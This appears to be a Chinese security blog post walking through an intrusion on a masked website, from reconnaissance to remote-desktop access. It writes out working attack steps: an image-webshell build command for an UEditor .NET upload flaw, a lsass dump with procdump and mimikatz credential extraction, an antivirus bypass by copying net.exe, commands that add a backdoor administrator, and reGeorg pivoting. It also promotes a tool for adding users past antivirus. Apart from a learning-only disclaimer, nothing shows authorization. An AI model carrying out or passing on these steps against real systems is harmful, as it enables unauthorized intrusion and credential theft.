> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/KPLOSs6OfFzr_2sNcIfKHA)

  

  

  

温馨提示  

  

  

  

 **本文章仅供学习交流使用，文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！**  

> 爱笑的人，运气都不会太差，因为运气差的人，从来都不会笑。
> 
>                                                                                                        ——热评

本次教程较为基础，打码比较严重，有很多不足的地方，希望各位大佬能够指正。

目标站: http://xxx.com   

项目要求: 登录远程桌面

通过 超级 ping 检测出网站的 IP 直接访问 ip *.*.*.*

![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0zo7HCEk6nYhw1MvdXHribSvGf67THFWEsAKPynkxOUzfqw3jUAs4uDAV7gbhYP8e0hnXCMyicVkQgA/640?wx_fmt=png)

通过 FOFA Pro View 这个插件可以快速的扫描出开放的端口 （由于更新，之前的不能用了，修改下地址就可以了）![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0zo7HCEk6nYhw1MvdXHribSvibpBnAnF5RVw8HzaX1ibcPbtNdpVG2sOKa2cicnK1PcibZG1nHcMgw8MxA/640?wx_fmt=png)

还有 Wappalyzer 这个插件也比较好用快速检测出网站的中间件等

![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0zo7HCEk6nYhw1MvdXHribSvCHAqmVm4E6ZRqqUaYZOENhwt6Vd2WRS2P5xbOt9x6a3eR8xJiavRQ0A/640?wx_fmt=png)

这里我比较疑惑 asp.net 一般都是搭配 mssql 数据库吧，它上面显示开放 3306。。。我访问一下直接 403

目录扫描扫出来了后台

![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0zo7HCEk6nYhw1MvdXHribSvaktjty3anfEs3iaD9Irr6zqLBaqXXWrI7UhlrKXUgmC1aabPDtfgtrg/640?wx_fmt=png)

尝试下弱口令

![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0zo7HCEk6nYhw1MvdXHribSvBe5tFrD6Lib5LFjdljA2icOzKodkgGNb7bZnqpeH4NaXicsSibSI6E3udA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0zo7HCEk6nYhw1MvdXHribSvtl872ELMgvZmYK3BticLqKyKrupf2lSz9ZUvbSwWvQMKmrd50009l3A/640?wx_fmt=png)

他这里会校验用户名 通过检测不会对访问次数进行限制 那还等啥 burp 一梭跑 刚好让他尝尝我大字典的厉害

![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0zo7HCEk6nYhw1MvdXHribSvhjCMaxj8Ue9j3oibia4eoMrxemQbaD9EtTIeoJD8N0TMMNAoCeLaRHxQ/640?wx_fmt=png)

最终我还是败了，啥也别说了，上神器 xray

出来打工，之前白嫖的高级版还没上手，今天试试水，贴出 xray 的官方使用说明 https://docs.xray.cool/#/tutorial/introduce 这款工具还是蛮好用的，啥也不说，开干（我懒，就使用基础爬虫 + 扫描网站了）。

![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0zo7HCEk6nYhw1MvdXHribSvRNohiaoukOlQQtCmNTTk1wj7iaiaWJ7EUtPmu5CncX8icXoV3KAgtvE1HQ/640?wx_fmt=png)

有点尬  只能手动测试下了， 习惯性的查看一下有没有目录遍历漏洞 （我自己的手法: 找到一张图片 -> 右键复制地址到地址栏 -> 查看相关路径 -> 访问）(注意: 图片一般最好选择文章或者资料里面的 别问，问就是直觉)

![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0zo7HCEk6nYhw1MvdXHribSvmULIv29TAdkPtJzn0CGc7Hjr9P3xnEmobhpBPP0t3dYX73RxB73vaQ/640?wx_fmt=png)

哦啊，没发现目录遍历但是发现了 ueditor，联想到之前插件扫到的 web 框架是 .net 的 有篇文章是专门讲解有关

Ueditor .net 下的漏洞的 https://www.freebuf.com/vuls/181814.html

先访问一下路径显示

![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0zo7HCEk6nYhw1MvdXHribSvXicvQammzDgXiadEpYoW6yFoiczyRbeHX3rGgliboVCxBicLmab22EUo8vg/640?wx_fmt=png)

利用 poc 上传（自己构造好 html 上传界面，然后上传自己服务器上的图片马用 ? 进行截断就可以了）（服务器：白嫖一年彩虹云云主机 图片马: 非常简单，我们只需要一张图片 1.jpg 一句话木马写好的 aspx 文件 1.aspx

之后我们进入到命令行。注意：将 aspx 文件和图片文件放到同一目录下，cmd 也要跳转到放文件的目录下  
之后执行命令

```
copy 1.jpg/b + 1.aspx/a 2.jpg
```

 新生成的 2.jpg 就是我们制作好的图片马了。【对二次渲染的图片上传点无效】）  

将 POC 中的 url 更换成我们的目标站, 上传格式 http://myweb.com/1.jpg?.aspx

![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0zo7HCEk6nYhw1MvdXHribSvRLqSTEu7yRzN6CWFAiblX6W315f85o6PrBs21PibYnicRR3OkPNhmbcvA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0zo7HCEk6nYhw1MvdXHribSvyUxXZ60ODl5NVWlfMicBHnBicQ8pCIN1eD1le146CmYLYJiaFzsb2v8RA/640?wx_fmt=png)

上传成功 直接返回一句话地址

![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0zo7HCEk6nYhw1MvdXHribSvIVy3KbPDZMJ6YGIxcLKHGO2AD4LQ7Thz3REhJufbtwlBRT1Bqiab2gw/640?wx_fmt=png)

成功解析，上菜刀

![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0zo7HCEk6nYhw1MvdXHribSv9W6ibFaWbBZjz3uicrdrzPlpgqW6q08luib5ZOYvE6x2SINuWD7rXTFuQ/640?wx_fmt=png)

成功 getshell ，查看下权限

![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0zo7HCEk6nYhw1MvdXHribSvX6FrV4ZZdFbPWCVH0Htdsm21E6P2RlHiaw7Kx3jibG29A8oqrBX20p3Q/640?wx_fmt=png)

这权限属实有点小，不过还能执行命令  ipconfig 发现是 内网。。。怪不得

![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0zo7HCEk6nYhw1MvdXHribSvNYV6WHasl8FjWbFl3RHvOT20pqXOTmKhvYuu0Ros9NkuPxRjAD3x5g/640?wx_fmt=png)

Systeminfo

![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0zo7HCEk6nYhw1MvdXHribSvu3xhG87Rvuibw9KwibWnJ2vCkyXeIgWOobUBGnhNFYhjJfoBlnRviaugQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0zo7HCEk6nYhw1MvdXHribSvxwibLBndfj055JNuz0EWUzqZtLzNrHKD9EFqGW11u1mOA0dGW6uZfZw/640?wx_fmt=png)

2012 修补了 8 个补丁 先祭出神站

https://bugs.hacking8.com/tiquan/ 在线 exp 对比，非常值得推荐

这里看到 2012 啥也别说烂土豆一梭跑

发现上传不上。。。

![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0zo7HCEk6nYhw1MvdXHribSvxumKrY6oW3jOmV4Qibqao2pibIKSdlpQia94CCjBc4LVX2DWq3ibwjClwg/640?wx_fmt=png)

刚开始我以为是权限的问题后来发现每个文件夹我都不能上传。。。

搞得我一脸懵 * 是不是因为菜刀的问题 那就直接先写入一个 aspx 的查询可读可写目录的马子

![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0zo7HCEk6nYhw1MvdXHribSvAnUmsO5LCJfIqL66coFyfnvRjHSgLjOMuR1uoFWX40D6jb31c3xnEQ/640?wx_fmt=png)

成功写入并查询成功 然后新建一个大马

![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0zo7HCEk6nYhw1MvdXHribSvT5m8ekq1Yef4PfibfHzhRHctsseIURFwhFJNqNl41NW1MRJNTzp3VZQ/640?wx_fmt=png)

不是吧，这么难的吗？还好我有预编译出错的 shell

![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0zo7HCEk6nYhw1MvdXHribSviaGAHxZudia2MMHVkVdBEoLrQodtN6YEUicqGfibwVNG9QsSwnuaet7jwA/640?wx_fmt=png)

成功 然后配合我的可读可写的马子 成功上传烂土豆

![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0zo7HCEk6nYhw1MvdXHribSvqEGaEk6u0yLtaYnH6dnyQFuV88Xsg4FL26RKPicmZhGmDDEcpz1N6ZQ/640?wx_fmt=png)

提权成功 get 到 system 权限 接下来就是找 3389 了 netstat -ano

![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0zo7HCEk6nYhw1MvdXHribSvCJRJuwuv7k3476BTszNx4orjyvvQrN4LWhGeKueCic1k4MuYAJs0FQw/640?wx_fmt=png)

看到一个 33890 越看越像 3389 tasklist  -svc : 查看系统进程 找到对应的 pid

![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0zo7HCEk6nYhw1MvdXHribSvVKD714zt2mkZcia9iaKHKicxmQYd7iaPDy7rCD4cQGsJ4AzUbyMEKOoXibw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0zo7HCEk6nYhw1MvdXHribSvED2cyFRprHp0kCic68IicqtxBZiabDhMasZx3wSkg8VDoQdcqnHA41ibGg/640?wx_fmt=png)

不得不吐槽一下这个管理员 真的有点 2...

3389 端口到手，内网 IP 到手，system 权限到手，接下来直接添加账号登录了

Net user abc abc /add 添加账号

net localgroup administrators abc /add 将用户添加到管理员组

执行命令发现无回显，刚开始以为对账号密码的长度有限制，但是测试了很多次发现不是这个问题，

明明是 system 权限为什么不能添加用户呢？

在白天打工的时候用手机找到很多类似对应的情况：有杀软、对账号密码有限制、防火墙等等 并且从网上找到了很多绕过的姿势 晚上回到家二话不说就开干，tasklist -svc

![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0zo7HCEk6nYhw1MvdXHribSvN75JMXTQ4nasfZo7y0o16xXp7Q6MZqibWw7b21tx25TxOHPclicJn63g/640?wx_fmt=png)

经过我一个一个的百度，终于发现了问题所在 原来存在火绒。。。（对杀毒软件进程不是很了解）

其实这里我想说明一下，很多人习惯性的遇到一点很问题就问别人，其实完全可以自己先百度一下，这样不仅可以加深对问题的记忆，将来在遇到同类型问题的时候也可以快速的找到解决的思路

利用白天找到的思路，可以先 kill 掉火狐的进程

但是事情往往是那么的不尽人意

![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0zo7HCEk6nYhw1MvdXHribSvspRlHDV4RU4yGMqvXibHXgrJF3UZrsaw1JAojefe5ALMjLmyGH82oeA/640?wx_fmt=png)

nm 玩鸡毛，system 都 kill 不掉？

再试试另一种方法，直接 mimimakatz 读取 administrator 的密码

但是这里是 server2012 尝试使用 procdump 来导出目标主机的 lsass.dmp 到本机用 mimikatz 读取密码

#### **1. 导出 lsass.exe**

```
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```

#### **2. 执行 mimikatz**

```
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
```

（前提需要管理员权限）

读出了 hash，因为是 WinServer2012 默认配置，因此 mimikatz 读不出明文密码

![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0zo7HCEk6nYhw1MvdXHribSvaR8Vh0SMsbvTCVrHAoUnuOl9AeBNmuau2JicW2MdHKlaJpr746ENqQw/640?wx_fmt=png)

HTLM Hash 解密不出来 还尝试了很多姿势，都没有成功，只能求助大佬了

![](https://mmbiz.qpic.cn/mmbiz_jpg/icCrVqOOyib0zo7HCEk6nYhw1MvdXHribSvImHxibdNUEzz3vCYdHeO8xibJCFZibaS99gicJJr483BUL1MI2btojURBw/640?wx_fmt=jpeg)

啥话不说直接开干

copy C:\Windows\System32\net.exe /net1.exe

![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0zo7HCEk6nYhw1MvdXHribSvewYKhGXQyUxdjVasicTuX9hK8YzlPFOplALtGeOpabUicV1gSFbeyA9w/640?wx_fmt=png)

成功绕过并添加到了管理员组，由于是内网我们直接上 Proxifier+reGeorg

相关使用方法可以参考：

https://www.freebuf.com/column/206524.html 进行了解

![](https://mmbiz.qpic.cn/mmbiz_jpg/icCrVqOOyib0zo7HCEk6nYhw1MvdXHribSvIoOibtDCfG5W9Vs6B1riaEkGjcaymy30Hia05FzKXjJJOegdVFPVI9ianw/640?wx_fmt=jpeg)

任务完成 打扫战场 收工

**总结：**

安装相关浏览器插件会很方便的进行信息收集

遇到问题不要一股脑的问别人，先想办法自己解决

多收集一些好用的工具、网站等，用的时候直接就能甩过来

多总结自己的经验和收获，这样你才能在实战中快速上手

  

福利：

经过安全研究者研究发现——通过调用 Windows Api 可以实现 Bypass 杀软实现用户添加，本文特为各位观众老爷带来了绕过杀软添加用户的神器，操作简单，全程杀软无提示~

公众号后台回复 useradd 即可获取程序~

![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0wrIeicWzI4DEEYaNHX59TkQsjQ14PWoicqDm5HicZtxe02VPGGHkibRN25gsiaZp5ia961rhU93CUhcLBw/640?wx_fmt=png)

  

**关注我们**

  

**一线渗透测试、红队技术文章有你好看！**

![](https://mmbiz.qpic.cn/mmbiz_png/icCrVqOOyib0ypnVmyU0BMTLq1va3ibr9FYwLnyQgvRzQibhLHUicsuoTiabetfqCHKoI7iaRddQxEBVMIHaeGq6ssrQw/640?wx_fmt=png)